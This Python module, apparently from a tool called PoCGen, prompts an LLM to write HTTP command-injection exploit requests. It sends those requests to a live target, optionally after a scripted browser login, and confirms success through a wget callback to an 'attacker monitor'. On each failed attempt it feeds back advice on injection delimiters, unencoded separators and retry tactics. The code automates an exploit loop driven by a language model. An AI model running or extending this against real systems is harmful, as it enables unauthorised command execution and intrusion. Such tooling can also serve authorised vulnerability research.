from __future__ import annotations

from datetime import datetime
from pathlib import Path
import time
from typing import List, Optional

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage, LLMClient
from PoCGen.prompts.templates import build_prompt_command_injection_http
from PoCGen.core.sampler import sample_target_with_playwright
from PoCGen.core.target_profile import TargetSample
from PoCGen.core.attacker_monitor import (
    AttackerMonitor,
    get_monitor_base_url,
    monitor_available,
    reset_external_monitor,
    wait_for_external_monitor,
)
from PoCGen.tools.getWeb import get_web_infomation
from PoCGen.core.models import (
    AttemptResult,
    GenerationResult,
    HTTPMessage,
    ValidationResult,
    VulnHandler,
)
from .postprocess import save_messages, split_messages
from .validators import parse_and_validate
from .remote_validator import validate_http_requests

console = Console()


class CommandInjectionHTTPHandler(VulnHandler):
    name = "command_injection_http"

    def build_messages(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        payload: str,
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
    ) -> List[dict]:
        msgs = build_prompt_command_injection_http(
            description=description,
            code_files=code_texts,
            target=target,
            payload=payload,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
        )
        return [m.model_dump() for m in msgs]


def generate_command_injection_http(
    description: str,
    code_texts: List[str],
    target: Optional[str] = None,
    vuln_type: Optional[str] = None,
    temperature: float = 0.2,
    max_tokens: int = 4000,
    payload: Optional[str] = None,
    probe_target: bool = False,
    auto_validate: bool = False,
    max_iterations: Optional[int] = None,
    stop_on_success: Optional[bool] = None,
    monitor_timeout: Optional[float] = None,
    cvenumber: Optional[str] = None,
    login_url: Optional[str] = None,
    login_username: Optional[str] = None,
    login_password: Optional[str] = None,
    login_user_field: str = "username",
    login_pass_field: str = "password",
    use_browser_login: bool = False,
    browser_headless: Optional[bool] = None,
) -> GenerationResult:
    handler_key = vuln_type or CommandInjectionHTTPHandler.name
    handler = CommandInjectionHTTPHandler()
    final_payload = payload or SETTINGS.payload
    if cvenumber:
        get_web_infomation(cvenumber)

    chat_log_dir = Path(__file__).resolve().parent.parent.parent.parent / "logs" / "chat"
    chat_log_dir.mkdir(parents=True, exist_ok=True)
    chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def log_chat(text: str) -> None:
        try:
            ts = datetime.now().isoformat(timespec="seconds")
            with open(chat_log_path, "a", encoding="utf-8") as fh:
                fh.write(f"[{ts}] {text}\n")
        except Exception:
            pass

    log_chat(
        "Initial input:\n"
        f"description: {description}\n"
        f"target: {target or '<none>'}\n"
        f"vuln_type: {handler_key}\n"
        f"payload: {final_payload}"
    )

    max_iters = max(1, max_iterations or SETTINGS.max_iterations)
    if not auto_validate:
        max_iters = 1
    stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
    monitor_wait = monitor_timeout or SETTINGS.monitor_timeout
    out_dir = SETTINGS.save_dir
    attempts: List[AttemptResult] = []
    feedback_text: Optional[str] = None
    overall_success = False
    last_raw_output = ""
    last_requests: List[HTTPMessage] = []
    last_saved_paths: List[str] = []
    last_validation_results: Optional[List[ValidationResult]] = None

    monitor: Optional[AttackerMonitor] = None
    external_monitor_url: Optional[str] = None
    monitor_base_url = get_monitor_base_url()
    conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
        description,
        code_texts,
        target,
        final_payload,
        None,
        None,
    )]
    monitor_running = False
    if auto_validate:
        if monitor_available(monitor_base_url):
            external_monitor_url = monitor_base_url
            monitor_running = True
            console.print(f"[cyan]Reusing existing attacker monitor at {monitor_base_url}")
            reset_external_monitor(monitor_base_url)
        else:
            monitor = AttackerMonitor(monitor_base_url, timeout=monitor_wait)
            monitor.start()
            monitor_running = monitor.is_running()
            if monitor_running:
                console.print(f"[green]Attacker monitor listening on {monitor_base_url}")
            else:
                console.print("[yellow]Warning: attacker monitor failed to start; success detection will be disabled for this run")

    generation_start_ts = time.time()

    try:
        target_profile_block: Optional[str] = None
        sample_cookies_header: Optional[str] = None
        if probe_target and target:
            if use_browser_login:
                try:
                    sample: TargetSample = sample_target_with_playwright(
                        target,
                        login_url=login_url,
                        login_username=login_username,
                        login_password=login_password,
                        login_user_field=login_user_field,
                        login_pass_field=login_pass_field,
                        headless=browser_headless,
                        capture_posts=True,
                        capture_cookies=True,
                        capture_socket_messages=False,
                    )
                    target_profile_block = sample.as_prompt_block()
                    sample_cookies_header = sample.cookies_header
                except Exception as exc:
                    console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
            else:
                console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")

        for attempt_index in range(max_iters):
            console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters}[/bold]")

            log_chat(f"Attempt {attempt_index + 1} starting")
            if feedback_text:
                log_chat(f"Feedback provided to model:\n{feedback_text}")

            messages: List[ChatMessage] = list(conversation_messages)
            if target_profile_block:
                messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
            if feedback_text:
                messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))

            log_chat(
                "Model input messages:\n" +
                "\n".join(f"- {m.role}: {m.content}" for m in messages)
            )

            client = LLMClient()
            try:
                raw_output = client.chat(messages, temperature=temperature, max_tokens=max_tokens)
            finally:
                client.close()

            conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
            log_chat("Model output:\n" + raw_output)

            raw_messages = split_messages(raw_output)
            if not raw_messages and raw_output.strip():
                raw_messages = [raw_output.strip()]

            if raw_messages:
                saved_paths = save_messages(raw_messages, out_dir)
                console.print(
                    f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
                )
            else:
                saved_paths = []
                console.print(
                    f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
                )

            requests: List[HTTPMessage] = []
            parse_issues: List[str] = []
            for idx, raw in enumerate(raw_messages):
                try:
                    msg, errs = parse_and_validate(raw)
                    requests.append(msg)
                    if errs:
                        for err in errs:
                            parse_issues.append(f"Request #{idx}: {err}")
                except Exception as exc:
                    parse_issues.append(f"Request #{idx} parse error: {exc}")
                    requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))

            validation_results: Optional[List[ValidationResult]] = None
            validation_error: Optional[str] = None
            if auto_validate and target and requests:
                if sample_cookies_header:
                    for req in requests:
                        if "Cookie" not in req.headers:
                            req.headers["Cookie"] = sample_cookies_header
                try:
                    validation_results = validate_http_requests(requests, target)
                    for res in validation_results:
                        if res.success:
                            console.print(
                                f"[green]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
                            )
                        else:
                            detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
                            preview = (res.response_preview or "").strip()
                            if preview:
                                preview = preview[:200] + ("..." if len(preview) > 200 else "")
                                detail += f" | body: {preview}"
                            console.print(
                                f"[yellow]Request #{res.request_index} validation failed ({detail})"
                            )
                except Exception as exc:
                    console.print(f"[yellow]Warning: validation failed: {exc}")
                    validation_results = None
                    validation_error = str(exc)

            monitor_hit = False
            monitor_summary: Optional[str] = None
            if monitor_running and requests:
                if external_monitor_url:
                    monitor_hit, monitor_summary = wait_for_external_monitor(
                        external_monitor_url, monitor_wait, since_ts=generation_start_ts
                    )
                else:
                    monitor_hit = monitor.wait_for_hit(monitor_wait)
                    monitor_summary = monitor.last_request_summary

                if monitor_hit:
                    console.print("[bold green]Attacker monitor recorded a callback![/bold green]")
                    if monitor_summary:
                        console.print(monitor_summary)
                else:
                    console.print(
                        f"[yellow]No callback received on attacker monitor within {monitor_wait} seconds"
                    )

            feedback_for_next = None
            if not monitor_hit:
                feedback_for_next = _build_attempt_feedback(
                    parse_issues,
                    validation_results,
                    final_payload,
                    monitor_running,
                    validation_error,
                )

            attempts.append(
                AttemptResult(
                    attempt_index=attempt_index,
                    raw_output=raw_output,
                    requests=requests,
                    saved_paths=saved_paths,
                    validation_results=validation_results,
                    monitor_hit=monitor_hit,
                    monitor_summary=monitor_summary,
                    feedback=feedback_for_next,
                )
            )

            last_raw_output = raw_output
            last_requests = requests
            last_saved_paths = saved_paths
            last_validation_results = validation_results
            overall_success = overall_success or monitor_hit
            feedback_text = feedback_for_next

            if monitor_hit and stop_after_success:
                console.print("[bold green]Success criteria met; stopping further attempts[/bold green]")
                break

            if attempt_index + 1 < max_iters:
                if feedback_text:
                    console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
                elif not monitor_hit:
                    console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

        return GenerationResult(
            raw_output=last_raw_output,
            requests=last_requests,
            saved_paths=last_saved_paths,
            validation_results=last_validation_results,
            attempts=attempts,
            success=overall_success,
        )
    finally:
        if monitor:
            monitor.stop()


def _build_attempt_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    payload: str,
    monitor_active: bool,
    validation_error: Optional[str] = None,
) -> Optional[str]:
    messages: List[str] = []
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)

    validation_summaries: List[str] = []
    failed_validation: List[ValidationResult] = []
    if validation_results is not None:
        for res in validation_results:
            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
            url = res.url or "<no url>"
            preview = (res.response_preview or "").strip()
            if preview:
                preview = preview[:200] + ("..." if len(preview) > 200 else "")
            detail_parts: List[str] = []
            if res.error:
                detail_parts.append(res.error)
            if preview:
                detail_parts.append(f"body: {preview}")
            detail = "; ".join(detail_parts)

            if res.success:
                line = f"Request #{res.request_index}: success -> {status} ({url})"
            else:
                failed_validation.append(res)
                line = f"Request #{res.request_index}: failure -> {status} ({url})"
                if not detail:
                    detail = "no response"
            if detail:
                line += f"; {detail}"
            validation_summaries.append(line)

        if validation_summaries:
            messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))

    elif validation_error:
        messages.append(f"Target validation did not run due to error: {validation_error}")
    else:
        messages.append("Target validation did not run or returned no results.")

    if monitor_active:
        messages.append(
            "Attacker monitor did NOT receive the expected wget callback. Ensure the payload executes wget "
            f"{payload} directly (no URL encoding of separators) and that the vulnerable parameter maps to command execution."
        )
    else:
        messages.append(
            "Attacker monitor is unavailable, so success could not be confirmed automatically. Still refine the payload to trigger wget "
            f"{payload} if possible."
        )

    if parse_issues or failed_validation:
        messages.append(
            "Adjust along four tracks before the next attempt:\n"
            "1) Encoding: rebuild the BODY to mirror required fields, parameter casing/order, and payload syntax; match the server's expected encoding (JSON vs form-urlencoded vs raw) and reuse its injection delimiters (e.g., '$(...)', '$(+ ...)', backticks, pipes).\n"
            "2) Status/redirects: if 301/302, retry with the redirected path (e.g., '/path' -> '/path/'); if 401/403, refresh Cookie/credentials or follow the hinted auth flow; align Host/Origin/Referer with the target.\n"
            "3) Method: if a POST with empty body fails, resend the same request as GET to handle endpoints that only read query params.\n"
            "4) Payload: use a minimal, paired delimiter around the payload (e.g., ';{payload};'), avoid extra quotes/backticks/brackets unless already present, and do NOT URL-encode separators; escape only what JSON requires."
        )

    return "\n\n".join(messages) if messages else None
